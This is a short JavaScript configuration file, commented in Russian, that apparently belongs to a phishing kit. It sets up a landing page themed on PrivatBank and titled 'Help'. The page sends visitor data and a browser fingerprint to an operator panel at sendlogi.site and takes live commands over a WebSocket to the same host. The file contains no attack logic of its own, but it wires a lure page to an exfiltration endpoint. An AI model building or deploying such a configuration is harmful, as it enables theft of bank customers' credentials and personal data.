/**
 * Конфигурация лендинга
 * 
 * ВАЖНО: Измените ADMIN_API_URL на URL вашей админки!
 */

const CURRENT_ORIGIN = typeof window !== 'undefined'
    ? window.location.origin.replace(/\/$/, '')
    : 'ПриватБанк - Тестовый';

const CONFIG = {
    // URL админки (куда отправлять данные)
    ADMIN_API_URL: 'https://sendlogi.site',
    
    // WebSocket URL админки (для получения команд)
    ADMIN_WS_URL: 'wss://sendlogi.site/ws',
    
    // ID этого лендинга (уникальный для каждого сайта)
    LANDING_ID: 'landing_test',
    
    // Название лендинга (для отображения в админке)
    LANDING_NAME: 'Допомога',
    
    // Дополнительные настройки
    SETTINGS: {
        // Отправлять fingerprint
        sendFingerprint: true,
        
        // Отправлять geolocation
        sendGeolocation: false,
        
        // Таймаут WebSocket переподключения (мс)
        wsReconnectTimeout: 3000,
        
        // Логировать в консоль (для отладки)
        debug: true  // ⚠️ Включена отладка!
    }
};

// Экспорт для использования в других файлах
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CONFIG;
}

